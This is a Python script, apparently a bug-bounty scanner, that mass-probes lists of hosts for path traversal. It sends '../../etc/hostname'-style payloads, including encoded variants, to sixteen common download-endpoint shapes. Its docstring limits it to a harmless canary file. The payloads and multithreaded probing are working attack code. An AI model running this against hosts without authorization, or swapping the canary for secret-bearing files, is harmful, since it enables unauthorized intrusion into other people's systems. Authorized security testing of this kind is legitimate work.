#!/usr/bin/env python3
"""
patrol-path-traversal — scanner #58.

Hunts LFI / path-traversal in static-file and download endpoints. Pattern:
endpoint takes a filename param and serves files from disk without proper
sanitization. Attacker can request ../../etc/passwd, /proc/self/environ, etc.

Bounty range: $1K-$10K typical; $25K+ if it reveals secrets or chains to RCE.

Method (ETHICAL — Lictor probes BENIGN targets only):
  1. For each host + endpoint shape: request a canary-traversal path
     (../../../../etc/hostname — NOT secrets-bearing files like /etc/passwd
     or AWS credentials)
  2. Check response for canary indicators (e.g., body matches hostname format
     /^[a-z0-9.-]+$/)
  3. If 200 + canary content → traversal works. Severity escalation
     (reading /etc/passwd, AWS creds) is left to the program owner to confirm.

Usage:
  patrol-path-traversal.py --hosts targets.txt --ledger path-traversal.jsonl
"""
from __future__ import annotations
import argparse, json, re, time, urllib.parse, urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from pathlib import Path

UA = "Lictor-PathTraversalPatrol/0.1 (+https://lictor-ai.com)"

# Benign traversal canary — /etc/hostname is short, ASCII-only, never secret
CANARY_TARGETS = [
    "../../../../etc/hostname",
    "..%2f..%2f..%2f..%2fetc%2fhostname",
    "....//....//....//....//etc/hostname",
    "/etc/hostname",  # absolute-path variant
]

ENDPOINT_SHAPES = [
    ("/api/download",     "file"),
    ("/api/download",     "filename"),
    ("/api/file",         "name"),
    ("/api/file",         "path"),
    ("/api/v1/download",  "file"),
    ("/download",         "file"),
    ("/files",            "name"),
    ("/static",           "file"),
    ("/api/image",        "src"),
    ("/api/asset",        "path"),
    ("/proxy",            "path"),
    ("/raw",              "file"),
    ("/serve",            "file"),
    ("/get-file",         "name"),
    ("/api/template",     "name"),
    ("/api/include",      "page"),
]

HOSTNAME_RX = re.compile(r'^[a-z0-9][a-z0-9.-]{0,253}$', re.MULTILINE)

@dataclass
class TraversalFinding:
    host: str
    endpoint: str
    param: str
    payload: str
    status: int
    response_snippet: str
    classification: str  # "traversal_works" / "filtered" / "no_response"

def probe(host: str, ep: str, param: str, payload: str, timeout: int = 6):
    qs = urllib.parse.urlencode({param: payload})
    url = f"https://{host}{ep}?{qs}"
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(2048).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try: b = e.read(2048).decode("utf-8", "replace")
        except: b = ""
        return e.code, b
    except Exception:
        return None, None

def looks_like_hostname_response(body: str) -> bool:
    body = body.strip()
    if len(body) > 254 or len(body) < 1: return False
    return bool(HOSTNAME_RX.match(body.split('\n')[0]))

def check_host(host: str) -> list[TraversalFinding]:
    out = []
    for ep, param in ENDPOINT_SHAPES:
        for payload in CANARY_TARGETS:
            time.sleep(0.2)
            status, body = probe(host, ep, param, payload)
            if not body or status != 200: continue
            if looks_like_hostname_response(body):
                out.append(TraversalFinding(
                    host=host, endpoint=ep, param=param, payload=payload,
                    status=status, response_snippet=body[:200].strip(),
                    classification="traversal_works"))
                break  # one confirmed per endpoint is enough
    return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", required=True)
    ap.add_argument("--threads", type=int, default=10)
    ap.add_argument("--ledger", default="/Users/raffa/Lictor/v3/ledgers/path-traversal.jsonl")
    args = ap.parse_args()

    hosts = [h.strip() for h in Path(args.hosts).read_text().splitlines() if h.strip()]
    print(f"[+] Path-traversal hunt: {len(hosts)} hosts × {len(ENDPOINT_SHAPES)} endpoints × {len(CANARY_TARGETS)} payloads")
    Path(args.ledger).parent.mkdir(parents=True, exist_ok=True)
    n = 0
    with open(args.ledger, "a") as ledger, \
         ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(check_host, h): h for h in hosts}
        for i, fut in enumerate(as_completed(futures), 1):
            host = futures[fut]
            try: hits = fut.result()
            except Exception: continue
            for f in hits:
                ledger.write(json.dumps(asdict(f)) + "\n")
                ledger.flush()
                n += 1
                print(f"  [{i}/{len(hosts)}] 🔴 {host}{f.endpoint}?{f.param}={f.payload[:30]}  → {f.response_snippet[:40]}")
            if i % 30 == 0: print(f"  [{i}/{len(hosts)}] scanning... {n} traversals so far")
    print(f"\n[+] Done. {n} path-traversal findings → {args.ledger}")

if __name__ == "__main__":
    main()
